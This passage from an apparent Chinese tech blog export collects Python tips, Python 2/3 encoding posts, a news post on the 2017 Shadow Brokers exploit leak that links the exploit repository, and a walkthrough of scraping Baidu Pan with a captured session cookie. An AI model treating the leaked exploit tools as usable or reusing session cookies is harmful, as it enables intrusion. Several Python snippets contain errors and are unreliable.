系统操作系统信息获取python安装路径12from distutils.sysconfig import get_python_libprint get_python_lib 获取当前python版本12sys.version_infosys.version 获取当前时间1234c=time.ctime()#自定义格式输出ISOTIMEFORMAT=’%Y-%m-%d %X’time.strftime( ISOTIMEFORMAT, time.localtime() ) 查看系统环境变量1os.environ["PATH"] 获取系统磁盘1os.popen("wmic VOLUME GET Name") 获取当前路径(包括当前py文件名)1os.path.realpath(__file__) 当前平台使用的行终止符1os.linesep 获取终端大小123rows, columns = os.popen('stty size', 'r').read().split()#python3以后存在可以使用osos.get_termial_size() 退出程序 return：返回函数的值，并退出函数。 exit()：直接退出。 sys.exit(): 引发一个SystemExit异常，若没有捕获错误，则python程序直接退出；捕获异常后，可以做一些额外的清理工作。 sys.exit(0):为正常退出，其他（1-127）为不正常，可抛异常事情供捕获。（一般用于主线程中退出程序） os._exit(0): 直接退出python程序，其后的代码也不会执行。（一般用于线程中退出程序） 网络操作域名解析为ip1ip= socket.getaddrinfo(domain,'http')[0][4][0] 获取服务器版本信息123sUrl = 'http://www.163.com'sock = urllib2.urlopen(sUrl)sock.headers.values() 文件操作open函数,使用wb、rb代替w、r12with open("test.txt","wr") as w: w.write("test") 这种写法可以兼容python2/3。输出一个目录下所有文件名称12345678def search(paths): if os.path.isdir(paths): #如果是目录 files=os.listdir(paths) #列出目录中所有的文件 for i in files: i=os.path.join(paths,i) #构造文件路径 search(i) #递归 elif os.path.isfile(paths): #如果是文件 print paths #输出文件名 文件查找123456import globprint glob.glob(r"E:/*.txt") #返回的是一个列表查找文件只用到三个匹配符：”*”, “?”, “[]“”*”匹配0个或多个字符；”?”匹配单个字符；”[]“匹配指定范围内的字符，如：[0-9]匹配数字。 查找指定名称的文件夹的路径1234567891011121314151617def search(paths,file_name,tag,lists): if os.path.isdir(paths): #如果是目录 if file_name==tag: #如果目录名称为tag lists.append(paths) #将该路径添加到列表中 else: #如果目录名称不为tag try: files_list=os.listdir(paths) #列出目录中所有的文件 for file_name in files_list: path_new=os.path.join(paths,file_name) #构造文件路径 search(path_new,file_name,tag,lists) #递归 except: #遇到特殊目录名时会报错 pass elif os.path.isfile(paths): #如果是文件 pass return lists 数据操作判断数据类型1isinstance("123",(int,long,float,complex) 字符串(string)字符串推导1234a="True"b=a if a=="True" else "False"&gt;&gt;&gt;print bTrue format方法拼接字符串与变量1234567a="&#123;test&#125; abc &#123;test2&#125;".format(test="123",test2="456")&gt;&gt;&gt;&gt;print a 123 abc 456或者：a="&#123;&#125;,&#123;&#125;".format(1,2)&gt;&gt;&gt;&gt;&gt;print a1,2 去掉小数点后面的数字12a=1.21311b=Int(math.floor(a)) 字符串倒置12&gt;&gt;&gt; a = "codementor"&gt;&gt;&gt; a[::-1] 字符串首字母变大写123info = 'ssfef'print info.capitalize()print info.title() 返回一个字符串居中，并使用空格填充至长度width的新字符串。1"center string".center(width) #width设置为控制台宽度，可控制输出的字符串居中。 列举所有字母123print string.ascii_uppercase 所有大写字母print string. ascii_lowercase 所有小写字母print string.ascii_letters 所有字母（包括大小写） 列表(list)列表去重12ids = [1,4,3,3,4,2,3,4,5,6,1]ids = list(set(ids)) 判断列表为空12a=[]if not a: 列表运算12345a=[1,2,3]b=[3,4,5]set(a)&amp;set(b) 与set(a)|set(b) 或set(a)-set(b) 非 单列表元素相加123a = ["Code", "mentor", "Python", "Developer"]&gt;&gt;&gt; print " ".join(a)Code mentor Python Developer 多列表元素分别相加12345678list1 = ['a', 'b', 'c', 'd']list2 = ['p', 'q', 'r', 's']&gt;&gt;&gt; for x, y in zip(list1,list2): print x, yapbqcrds 将嵌套列表转换成单一列表1234a = [[1, 2], [3, 4], [5, 6]]&gt;&gt;&gt; import itertools&gt;&gt;&gt; list(itertools.chain.from_iterable(a))[1, 2, 3, 4, 5, 6] 列表内元素相加12a=[1,2,3]（数字）sum(a) 产生a-z的字符串列表1map(chr,range(97,123)) 列表复制123a=[1,2,3]b=a当对b进行操作时，会影响a的内容，因为共用一个内存指针，b=a[:] 这样就是单独复制一份了。 列表推导if+else配合列表解析1[i if i &gt;5 else -i for i in range(10)] 多层嵌套列表1234a=[[1,2],[3,4]]b=[for j in i for i in a]print b[1,2,3,4] 生成一个生成器，调用next方法，可以减少内存开支。1a=(i else i+1 for i in b if i==1) 字典推导更换key与value位置12dict=&#123;"a":1,"b":2&#125;b=&#123;value:key for key value in dict.items()&#125; 字典操作(dict)筛选出值重复的key123456list1=self.dict_ip.items() ddict=defaultdict(list) for k,v in list1: ddict[v].append(k) list2=[(i,ddict[i]) for i in ddict if len(ddict[i])&gt;1] dict_ns=dict(list2) 字典排序（py2）12file_dict=&#123;"a":1,"b":2,"c":3&#125;file_dict_new=sorted(file_dict.iteritems(), key=operator.itemgetter(1),reverse=True) ##字典排序,reverse=True由高到低，itemgetter(1)表示按值排序，为0表示按key排序。 字典值判断123b=&#123;"a":1&#125;a=b.get("a","") #如果不存在a，则返回””c=a if a else 0 #如果存在a，则返回a，不然返回0 模块操作导入模块时，设置只允许导入的属性或者方法。12345678910fb.py:-----------------------__all__=["a","b"]a="123"c="2345"def b(): print “123”-----------------------from fb import *可以导入__all__内定义的变量，a跟b()可以导入，c不行。如果不定义__all__则所有的都可以导入。 导入上级目录下的包12sys.path.append("..")from spider.spider_ import spider_ 导入外部目录下的模块1需要在目标目录下创建__init__.py文件，内容随便。 增加模块属性1234有时候源代码中，我们需要写上自己的名字以及版本介绍信息，可以用__name__的方式定义。a.py:#! -*- coding:utf-8 -*-__author__="nMask" 然后当我们导入a这个模块的时候，可以输出dir(a)看看12345&gt;&gt;&gt; import p&gt;&gt;&gt; print dir(p)['__author__', '__builtins__', '__doc__', '__file__', '__name__', '__package__']&gt;&gt;&gt; print p.__author__nmask 动态加载一个目录下的所有模块1234567891011目录：---test ----a.py ----b.py---c.pyc.py导入test下面的所有模块：for path in ["test"]: for i in list(set([os.path.splitext(i)[0] for i in os.listdir("./"+path)])): if i!="__init__" and i!=".DS_Store": ##排除不必要的文件 import_string = "import path+"."+i+" exec import_string #执行字符串中的内容 函数操作eval/exec1234def test(content): print contentexec(“test(‘abc')”) 输出：abc说明：exec函数没有返回值1234def test(content): return contentprint eval(“test(‘abc')”) 输出：abc说明：eval函数有返回值 装饰器函数输出当前时间装饰器12345def current_time(aclass): def wrapper(): print "[Info]NowTimeis:",time.ctime() return aclass() return wrapper itertools迭代器123p=product(["a","b","c","d"],repeat=2)----[("a","a"),("b","b")......] reduce函数函数本次执行的结果传递给下一次。1234def test(a,b): return a+breduce(test,range(10))结果：从0+1+2......+9 enumerate函数输入列表元素以及序列号123n=["a","b","c"]for i,m in enumerate(n): print(i,m) 函数超时时间设置@于2017.05.27更新利用signal设置某个函数执行的超时时间1234567891011121314151617181920212223import timeimport signal def test(i): time.sleep(0.999)#模拟超时的情况 print "%d within time"%(i) return i def fuc_time(time_out): # 此为函数超时控制，替换下面的test函数为可能出现未知错误死锁的函数 def handler(signum, frame): raise AssertionError try: signal.signal(signal.SIGALRM, handler) signal.alarm(time_out)#time_out为超时时间 temp = test(1) #函数设置部分，如果未超时则正常返回数据， return temp except AssertionError: print "%d timeout"%(i)# 超时则报错 if __name__ == '__main__': for i in range(1,10): fuc_time(1) 函数出错重试利用retrying模块实现函数报错重试功能12345678import randomfrom retrying import retry@retrydef have_a_try(): if random.randint(0, 10) != 5: raise Exception('It's not 5!') print 'It's 5!' 如果我们运行have_a_try函数，那么直到random.randint返回5，它才会执行结束，否则会一直重新执行，关于该模块更多的用法请自行搜索。 程序操作@于2017.05.27更新 Ctrl+C退出程序利用signal实现ctrl+c退出程序。1234567891011121314import signalimport sysimport timedef handler(signal_num,frame): print "\nYou Pressed Ctrl-C." sys.exit(signal_num)signal.signal(signal.SIGINT, handler)# 正常情况可以开始你自己的程序了。# 这里为了演示，我们做一个不会卡死机器的循环。while 1: time.sleep(10)# 当你按下Ctrl-C的时候，应该会输出一段话，并退出. 程序自重启利用os.execl方法实现程序自重启1234567891011121314import timeimport sysimport osdef restart_program(): python = sys.executable print "info:",os.execl(python, python, * sys.argv) #os.execl方法会代替自身进程，以达到自重启的目的。if __name__ == "__main__": print 'start...' print u"3秒后,程序将结束...".encode("utf8") time.sleep(3) restart_program() 时间墙@2017.04.19创建此文@2017.04.24增加eval/exec函数@2017.05.27增加程序操作、函数超时、函数出错重试@2017.08.24增加format拼接字符串与变量、字符串推导]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3编码之美]]></title>
    <url>../../../../../../../../2017/04/18/1/</url>
    <content type="text"><![CDATA[终是谁使弦断，花落肩头，恍惚迷离 之前一直在使用python2.x版本，其中的编码问题颇为头疼，根据使用经验以及实验测试，前些日子总结了一些关于python2.x的编码问题，会在本文最后给出地址。本篇主要描述python3中的编码，如果称Python2的编码为殇，那么Python3的编码就应该为美了。 我在python2编码之殇一文的最后介绍过，想要解决python2中的编码问题，最直接有效的方法就是将所有外部的字符串转变为unicode格式，再在python内部了流转。python3正是在这方面做了很大的优化。 python3中也有2种编码格式，分别为str与byte，这里的str相当于2中的unicode，byte相当于2中的str。再者python3将python源代码编码从ascii改成了utf-8，从外部接收的编码自动转化成了str(2中的unicode)，大大减少产生编码异常的点。与2一样，3中的编码原则就是将外部接收的字符编码成str（unicode字符），输出时再编码成bytes编码。光说没用，我用实验证明。 bytes/str/unicode区别更新于2017年5月2号 python3的bytes与str bytes表示字符的原始8位值，str表示Unicode字符。将unicode字符表示为二进制数据（原始8位值），最常见的编码方式就是UTF-8。python2与3中的unicode字符没有和特定的二进制编码相关联，因此需要使用encode方法。 在python3中bytes与str是绝对不会等价的，即使字符内容为””，因此在传入字符序列时必须注意其类型。 python2的str与unicode str表示字符的原始8位值，unicode表示Unicode字符。 在python2中，如果str只包含7位ASCII字符（英文字符），那么unicode与str实例类似于同一种类型（等价的），那么在这种情况下，以下几种操作是正常的： 可以用+号连接str与unicode 可以用=与!=来判断str与unicode 可以用’%s’来表示Unicode实例 系统以及源代码编码3.x已经把源代码编码以及系统编码从ascii都变成了utf-8，避免了中文报错。123456&gt;&gt;&gt; import sys&gt;&gt;&gt; print(sys.getdefaultencoding())utf-8&gt;&gt;&gt; print(sys.getfilesystemencoding())utf-8&gt;&gt;&gt; 其次，我们可以看到我们定义的a为str（相当于2.x中unicode），而它在windows控制台输出时也没有因为编码问题而报错。123&gt;&gt;&gt; a="你好"&gt;&gt;&gt;print(a)你好 字符串编码1234567&gt;&gt;&gt; a="你好"&gt;&gt;&gt; print(type(a))&lt;class 'str'&gt;&gt;&gt;&gt; b=a.encode("utf-8")&gt;&gt;&gt; print(type(b))&lt;class 'bytes'&gt;&gt;&gt;&gt; 我们可以看到，3.x中的str格式类似于2.x中的unicode，而2.x中的str相当于3.x中的bytes. 网页编码结果：返回的是bytes格式的，只要decode转化为str就ok了。 文件编码结果：从文件中读取出来的是str（2.x中的unicode），因此不用转码。 open函数注意python2中open句柄是str(原始二进制)的，而python3中是str(unicode字符)，因此一下代码在python2中正常，在python3中会报错：12with open("test","w") as w: w.write("123") 因为python3中，要求传入的值为str类型，而不是bytes类型，open函数自带encoding方法。解决方法：12with open("test","wb") as w: w.write("123") 同理，read函数也是一样，写成rb，就可以兼容2与3了。 传送门Python2编码之殇Python2编码之殇续集]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统SMB/RDP远程命令执行漏洞]]></title>
    <url>../../../../../../../../2017/04/15/Windows系统SMB-RDP远程命令执行漏洞/</url>
    <content type="text"><![CDATA[黑客无所不能 介于此次爆发的漏洞事件危害太过严重，本文当回搬运工，分享此次NSA方程式组织泄露的0day事件。由于信息量太过庞大，没有对其中的技术细节进行研究，不过请相信我，赶紧拔电源吧。事件具体细节请参考：长亭科技专栏exploit地址：https://github.com/x0rz/EQGRP_Lost_in_Translation 事件起因 2016 年 8 月有一个 “Shadow Brokers” 的黑客组织号称入侵了方程式组织窃取了大量机密文件，并将部分文件公开到了互联网上，方程式（Equation Group）据称是 NSA（美国国家安全局）下属的黑客组织，有着极高的技术手段。这部分被公开的文件包括不少隐蔽的地下的黑客工具。另外 “Shadow Brokers” 还保留了部分文件，打算以公开拍卖的形式出售给出价最高的竞价者，“Shadow Brokers” 预期的价格是 100 万比特币（价值接近5亿美金）。这一切听起来难以置信，以至于当时有不少安全专家对此事件保持怀疑态度，“Shadow Brokers” 的拍卖也因此一直没有成功。 北京时间 2017 年 4 月 14 日晚，“Shadow Brokers” 终于忍不住了，在推特上放出了他们当时保留的部分文件，解压密码是 “Reeeeeeeeeeeeeee”。 这次的文件有三个目录，分别为“Windows”、“Swift” 和 “OddJob”，包含一堆令人震撼的黑客工具（我们挑几个重要的列举如下）： EXPLODINGCAN 是 IIS 6.0 远程漏洞利用工具 ETERNALROMANCE 是 SMB1 的重量级利用，可以攻击开放了 445 端口的 Windows XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2 并提升至系统权限。 除此之外 ERRATICGOPHER 、ETERNALBLUE 、ETERNALSYNERGY 、ETERNALCHAMPION 、EDUCATEDSCHOLAR、 EMERALDTHREAD 等都是 SMB 漏洞利用程序，可以攻击开放了 445 端口的 Windows 机器。 ESTEEMAUDIT 是 RDP 服务的远程漏洞利用工具，可以攻击开放了3389 端口且开启了智能卡登陆的 Windows XP 和 Windows 2003 机器。 FUZZBUNCH 是一个类似 MetaSploit 的漏洞利用平台。 ODDJOB 是无法被杀毒软件检测的 Rootkit 利用工具。 ECLIPSEDWING 是 Windows 服务器的远程漏洞利用工具。 ESKIMOROLL 是 Kerberos 的漏洞利用攻击，可以攻击 Windows 2000/2003/2008/2008 R2 的域控制器。 漏洞影响据说影响全球70%的windows服务器，想想都恐怖，不说了，我拔电源了。 漏洞对应的补丁 临时修复方案 关闭445,137,139,3389端口，或者上防护设备限制特定ip访问。 坐等微软补丁]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>系统漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2编码之殇续集]]></title>
    <url>../../../../../../../../2017/04/14/1/</url>
    <content type="text"><![CDATA[蝴蝶很美，终究蝴蝶飞不过沧海 先说点题外话，在下班去看【速八】的路上发现昨晚知乎上分享的色情资源引发的百度网盘之战因为违反法律法规被删除了，看来搞技术的果然还是得好好研究技术，研究什么色情呢？另外补充一句：速八真难看！ 回归正题吧，继之前分析的python2.x编码问题，再补充点疑难杂症，之前python2编码分析文章请移步Python编码之殇，这次补充的内容主要针对string与unicode编码本身的问题，之前也困扰了我很久，最近凑空研究了下，明白了很多，在此补充分享，欢迎纠错。 故事是这样开始的 下午茶时间，某司（司机）扔给了我一个奇怪的字符串，说是帮忙转化成中文，看了看扔过来的这串奇怪字符，原本我是拒绝的，然而还没等我答复他便补充了句：已订好速八，晚上约，并抛了个坏笑的表情（你懂的那种表情），我不明白坏笑是什么意思，但我猜可能有某种特殊的含义，因为对方毕竟是位老司机。没辙，看在睡了几晚的份上，还是决定好好研究下这串代码。1a="\\u8fdd\\u6cd5\\u8fdd\\u89c4" 简单分析下这串字符，感觉像是unicode编码的内容，但有觉得少了点啥，于是我便开始了一系列的实验。我想弄清楚这串到底是什么东西，首先我对unicode编码的字符串进行了测试，看看其长啥样。1234567&gt;&gt;&gt; a=u"你好"&gt;&gt;&gt; au'\u4f60\u597d' #（unicode编码）&gt;&gt;&gt; print type(a) &lt;type 'unicode'&gt;&gt;&gt;&gt; print a你好 实验结果表示unicode字符串长这样：u’\u4f60\u597d’，但它实际代表的是中文：你好。至于为什么输入a，输出的是unicode字符内容，而print a输出的是str格式的中文：你好，原因想必是python中的print语句会自动将unicode字符转化成str格式。如果您对unicode与string不了解，那么请回到文章开头，移步之前那篇分析编码的文章，我想会对您有帮助。 竟然知道了unicode字符长啥样，那么我们可以排除那个奇怪的字符串并不是unicode字符串了。为啥呢？很明显，因为它前面没有u啊。 看到这里，您是不是有点迷糊了呢？虽然它前面没有u（u”\u4f60….”），但是它长得确实很像unicode字符啊。不用着急，接下来让我来好好介绍下字符串变量编码 以及字符串内容编码 的差异。 说明：以上两个概念是我自己临时取的，不代表官方解释，如有偏差请谅解 所谓字符串变量编码就是我们平常所说的编码，比如string、unicode，string又包含utf-8、gbk、gb2312等。判断方式很简单，用type函数即可。123456&gt;&gt;&gt; a=u"你好"&gt;&gt;&gt; print type(a) &lt;type 'unicode'&gt;&gt;&gt;&gt; a="你好"&gt;&gt;&gt; print type(a)&lt;type 'str'&gt; 我们可以看到，unicode或者string代表的是a这个字符串变量的一种编码格式，跟其内容无关。我们知道定义a=”test”,那么a是string编码；反之定义a=u”test”，a便是unicode编码，那么我想问：test是什么编码的？（这里问的是test，而不是a）有人会说，test就是一个普通的字符串，没错它确实是一个字符串，它表示a的内容。那么同理当定义1a="\\u8fdd\\u6cd5\\u8fdd\\u89c4" 时，a本身是str格式的字符串，那么1\\u8fdd\\u6cd5\\u8fdd\\u89c4 内容本身呢？没错，其内容本身是一个unicode编码后的字符串。好了，还是让我们做实验测试吧。 我们先看看被常见的几种编码格式编码后的字符串内容：123456789101112&gt;&gt;&gt; a=u"你好".encode("gbk")&gt;&gt;&gt; a'\xc4\xe3\xba\xc3' #内容为gbk编码&gt;&gt;&gt; a=u"你好".encode("utf-8")&gt;&gt;&gt; a'\xe4\xbd\xa0\xe5\xa5\xbd' #内容为utf-8编码&gt;&gt;&gt; a=u"你好".encode("gb2312")&gt;&gt;&gt; a'\xc4\xe3\xba\xc3' #内容为gb2312编码&gt;&gt;&gt; a=u"你好"&gt;&gt;&gt; au'\u4f60\u597d' #内容为unicode编码 请注意以上几种编码的内容，观察其特点，然后我们再来看下那个奇怪的字符串。12345678&gt;&gt;&gt; a="\\u8fdd\\u6cd5\\u8fdd\\u89c4"&gt;&gt;&gt; a'\\u8fdd\\u6cd5\\u8fdd\\u89c4'&gt;&gt;&gt; print type(a) &lt;type 'str'&gt;&gt;&gt;&gt; print a \u8fdd\u6cd5\u8fdd\u89c4&gt;&gt;&gt; 我们看到变量a是string格式的。12345&gt;&gt;&gt; a=u"\\u8fdd\\u6cd5\\u8fdd\\u89c4" #在前面加个u，将变量a变成unicode&gt;&gt;&gt; print type(a) &lt;type 'unicode'&gt;&gt;&gt;&gt; print a #相当于a.encode("utf-8")\u8fdd\u6cd5\u8fdd\u89c4 我们在变量””前面加个u，表示变量a为unicode字符串，其内容为1\\u8fdd\\u6cd5\\u8fdd\\u89c4 接下print a，发现跟上一步的结果一样，没错，因为print将a从unicode变成了string，而其内容看上去少了一些斜杠。123456&gt;&gt;&gt; b=u"\u8fdd\u6cd5\u8fdd\u89c4"&gt;&gt;&gt; print type(b) &lt;type 'unicode'&gt;&gt;&gt;&gt; print b违法违规&gt;&gt;&gt; 紧接着，我将a的内容，也就是\u8fdd\u6cd5\u8fdd\u89c4，重新赋值给变量b，此时””也加个u，让其成为unicode格式，然后print b，神奇的一幕发生了，输出的结果竟然转化成中文了。其原因我想是，print语句不仅会将字符串变量a转为成string，也会将其内容转化为string。123456&gt;&gt;&gt; a="你好"&gt;&gt;&gt; a'\xc4\xe3\xba\xc3'&gt;&gt;&gt; a=u"\xc4\xe3\xba\xc3"&gt;&gt;&gt; print aÄãºÃ 以上例子定义变量a为unicode编码，而其内容为string-utf-8编码，此时当print a时，print语句尝试将a的内容转化为string，但由于其本身就是string编码，因此出现了乱码，反之是可以的。12345678&gt;&gt;&gt; a="你好"&gt;&gt;&gt; a'\xc4\xe3\xba\xc3'&gt;&gt;&gt; b="\xc4\xe3\xba\xc3"&gt;&gt;&gt; b.decode("gbk")u'\u4f60\u597d'&gt;&gt;&gt; print b.decode("gbk")你好 看到这您可能会觉得奇怪，我们定义变量a的内容是这样的\u8fdd\u6cd5\u8fdd\u89c4，而那个奇怪的字符串是这样的1\\u8fdd\\u6cd5\\u8fdd\\u89c4 好像多了一些斜杠，表急，看完以下这个测试，您就能明白两者的区别。12345678910111213141516&gt;&gt;&gt; b="\\xc4\\xe3\\xba\\xc3"&gt;&gt;&gt; b.decode("gbk")u'\\xc4\\xe3\\xba\\xc3'&gt;&gt;&gt; print b.decode("gbk")\xc4\xe3\xba\xc3&gt;&gt;&gt; c="\xc4\xe3\xba\xc3"&gt;&gt;&gt; print c.decode("gbk")你好#################&gt;&gt;&gt; a=u"\\u8fdd\\u6cd5\\u8fdd\\u89c4”&gt;&gt;&gt; print a\u8fdd\u6cd5\u8fdd\u89c4&gt;&gt;&gt; b=u"\u8fdd\u6cd5\u8fdd\u89c4”&gt;&gt;&gt; print b违法违规&gt;&gt;&gt; 简单来说，那个奇怪的字符串是经过2次unicode编码后的内容。 内置函数使用 当然让其转化为中文可以借助一个内置的函数，我之所以分布演示，是想更清楚得展示其具体含义。将unicode编码的内容转化为中文（注意是内容，而不是字符串变量）123a="\\u8fdd\\u6cd5\\u8fdd\u89c4" #变量a的内容为unicode编码，变量a为string编码（""前不要加u）b=a.decode('unicode-escape')print b 将string编码的内容转化为中文（注意是内容，而不是字符串变量）123a="\\xe5\\x85\\xb3\\xe4\\xba\\x8e\\xe4" #变量a的内容为string编码，变量a为string编码（""前不要加u）b=a.decode('string-escape')print b unicode-escape与utf-8的区别补充于2017年4月27日12345678&gt;&gt;&gt;a="\u4e0a\u4f20\u6210\u529f"&gt;&gt;&gt;b=a.decode('utf-8')&gt;&gt;&gt;print type(b)&lt;type 'unicode'&gt;&gt;&gt;&gt;bu'\\u4e0a\\u4f20\\u6210\\u529f'&gt;&gt;&gt;print b\u4e0a\u4f20\u6210\u529f 当对变量a做decode(‘utf-8’)时，除了对把变量a的类型从str变成了unicode,a变量的内容也做了utf-8解码，所以多了一些斜杠。12345678&gt;&gt;&gt;a="\u4e0a\u4f20\u6210\u529f"&gt;&gt;&gt;c=a.decode("unicode-escape")&gt;&gt;&gt;print type(c)&lt;type 'unicode'&gt;&gt;&gt;&gt;cu'\u4e0a\u4f20\u6210\u529f'&gt;&gt;&gt;print c上传成功 而对变量a做decode(‘unicode-escape’)时，貌似只有变量本身被decode成unicode了，其内容没有发生改变。 我们知道print函数会将变量以及变量内容都encode成str，因此第二个例子能输出中文，而第一个例子输出的还是unicode类型的内容，只不过少了一些斜杠，因为它还需要再encode一次。当然本例子的转化，有更简单的方法，如下：123&gt;&gt;&gt; d=u"\u4e0a\u4f20\u6210\u529f" #定义变量d时，前面加个u，将其变成unicode&gt;&gt;&gt; print d上传成功 开了一轮飞车，不知道大家有没有晕车，如果实在搞不清以上各种编码关系，没关系记住最后2个函数即可。 故事是这样结束的 看着屏幕中输出熟悉的中文字符，我激动地将转码后的内容抛给某司，并殷切地等待着酬劳，等待着欣赏速八大酒店顶层房间迎接的那一抹夕阳，以及细细品味着那一抹诡异的坏笑。直到最终屏幕跳出了一行字：速八8点场，影院见。 补充2017年4月21号存在一个list列表，列表中的字段是unicode格式的，当输出这个list时，内容如下：1[u'\u827a\u672f\u9986', u'\u5b58\u50a8\u7ba1\u7406', u'\u609f\u8005', u'\u827a\u54c1', u'\u7ca4\u5907\u4eac', u'\u767e\u79cd', u'\u5fae\u55b7', u'\u827a\u672f\u4f5c\u54c1', u'\u57f9\u690d', u'\u6444\u5f71\u5bb6', u'\u666e\u53ca\u6559\u80b2', u'\u5927\u9053\u81f3\u7b80', u'\u88c5\u5e27', u'\u96c5\u660c\u4ee5', u'\u9274\u8bc1', u'\u4e07\u6377', u'\u6838\u5fc3\u6280\u672f', u'\u884d\u751f\u54c1'] 怎么让列表里面的内容为中文？我猜想，输出列表时，会自动将里面的中文进行编码，因此可以这样处理：1print str([i.encode("utf-8") for i in list_nokeyword]).decode('string-escape’) 输出看看吧1['艺术馆', '存储管理', '悟者', '艺品', '粤备京', '百种', '微喷', '艺术作品', '培植', '摄影家', '普及教育', '大道至简', '装帧', '雅昌以', '鉴证', '万捷', '核心技术', '衍生品'] 传送门Python2编码之殇Python3编码之美]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[色情资源引发的百度网盘之战]]></title>
    <url>../../../../../../../../2017/04/12/2/</url>
    <content type="text"><![CDATA[为了荣誉而战 事情的起因是这样的，由于我想找几部经典电影欣赏欣赏，于是便向某老司机寻求资源（我备注了需要正规视频，绝对不是他想的那种资源），然后他丢给了我一个视频资源网站，说是比较有名的视频资源网站。我信以为真，便激动地点开寻求经典电影，于是便引出了一段经典的百度网盘之战。免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，文章出现的截图只做样例演示，请勿非法使用先来看下这个视频网站的截图：不得不说，这是一个正规的网站，正规的视频，只是看着标题的我想多了而已。怀着满满的求知欲，我点开了链接，并在网页下方看到了视频资源链接。 这里有2种资源，一种是百度网盘，另一种是迅雷种子，不得不说这个网站还是比较良心，相较于只发图不留种的某些网站。按照正常逻辑，此时我应该点开资源地址静静地欣赏起来（不对，其实我不是那样的人），因此我选择默默地将资源添加到网盘收藏。看到网盘又多了几部佳作，心情顿时爽了很多，但仅仅添加几部作品并没有满足我的收藏欲望，于是我便开始探索如何快速将视频资源自动添加到百度网盘，也由此引发了我对于百度网盘的一系列斗争。 战争序幕首先通过观察该网站url构成，以及网页源码组成，我决定采用爬取的方式采集资源链接地址。网页截图：该过程并没有遇到很大的问题，我采用了python+协程的方式进行采集，很快便获取了一部分资源地址：百度网盘资源地址： 写完采集数据脚本，采集完部分数据已是晚上11点，原本应该洗洗睡了，然而技术探索的力量鼓舞着我继续前行。目前资源地址都有了，然而对于百度网盘资源，仍然需要一一点开，然后添加到我的网盘，此步骤太耗费精神，因此我决定继续挖掘自动添加资源到百度网盘的方法。 注意：以下内容是本文的重点技术内容，关乎着我与百度网盘一战的最终结局，请勿走开，精彩继续。 终极之战首先我通过抓包，查看源码，审查元素等方式分析了百度分享页面的特征，判断其是否适合爬虫方式。在经过一系列测试之后，我发现虽然过程有点曲折，但还是可以用爬虫的方式实现自动化的添加资源到网盘。 要实现这一技术，我总结了以下几点流程： 获取用户cookie（可以手动登录然后抓包获取） 首先爬取如：http://pan.baidu.com/s/1o8LkaPc网盘分享页面，获取源码。 解析源码，筛选出该页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）。 构造post包（用来添加资源到网盘），该包需要用到以上4个参数+cookies。 获取cookie抓取cookie可以用很多工具，我用了火狐的Tamper插件，效果如下：获取登录的数据包：查看登录发送的请求包，发现有账号密码，当然我们这里需要的是cookie，可以在response中查看到。 cookie的格式如下：1234567BAIDUID=52C3FE49FD82573C4ABCEAC5E77800F6:FG=1; BIDUPSID=52C11E49FD82573C4ABCEAC5E778F0F6; PSTM=1421697115; PANWEB=1; Hm_lvt_7a3960b6f067eb0085b7196ff5e660b0=1491987412; Hm_lpvt_7a3960b6f067eb0085b7f96ff5e6260b0=1491988544; STOKEN=3f84d8b8338c58f127c29e3eb305ad41f7c68cefafae166af20cfd26f18011e8;SCRC=4abe70b0f9a8d0ca15a5b9d2dca40cd6;PANPSC=16444630683646003772%3AWaz2A%2F7j1vWLfEj2viX%2BHun90oj%2BY%2FIsAxoXP3kWK6VuJ5936qezF2bVph1S8bONssvn6mlYdRuXIXUCPSJ19ROAD5r1J1nbhw55AZBrQZejhilfAWCWdkJfIbGeUDFmg5zwpdg9WqRKWDBCT3FjnL6jsjP%2FyZiBX26YfN4HZ4D76jyG3uDkPYshZ7OchQK1KQDQpg%2B6XCV%2BSJWX9%2F9F%2FIkt7vMgzc%2BT; BDUSS=VJxajNlVHdXS2pVbHZwaGNIeWdFYnZvc3RMby1JdFo5YTdOblkydkdTWlVmUlZaSVFBQUFBJCQAAAAAAAAAAAEAAAA~cQc40NLUy7XEwbm359PwABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFTw7VhU8O1Yb 由于此cookie涉及到个人账号，因此我做了改动处理，但格式应该是一样的。 访问百度资源分享页面 请求页面如：http://pan.baidu.com/s/1o8LkaPc 获取cookie以后，可以在访问百度资源分享页面时，在headers里面写入cookie值，并使用该cookie登录，期间我也失败过几次，原因还是需要加上其他header参数（如果不加cookie参数，返回的结果将是”页面不存在”）。 请求成功之后，我们可以在源码中找到一些我们需要的内容，比如页面分享资源的名称、shareid、from（uk)、bdstoken、appid（app_id）值。 构造添加资源POST包首先看下post包的构造：123456789101112131415POST https://pan.baidu.com/share/transfer?shareid=2337815987&amp;from=1612775008&amp;bdstoken=6e05f8ea7dcb04fb73aa975a4eb8ae6c&amp;channel=chunlei&amp;clienttype=0&amp;web=1&amp;app_id=250528&amp;logid= HTTP/1.1Host: pan.baidu.comConnection: keep-aliveContent-Length: 169Accept: */*Origin: https://pan.baidu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: https://pan.baidu.com/s/1kUOxT0V?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: filelist=["/test.rar"]&amp;path=/ 在post包的url中有一些参数，填写我们获取到的内容即可，还有一个logid参数，内容可以随便写，应该是个随机值然后做了base64加密。 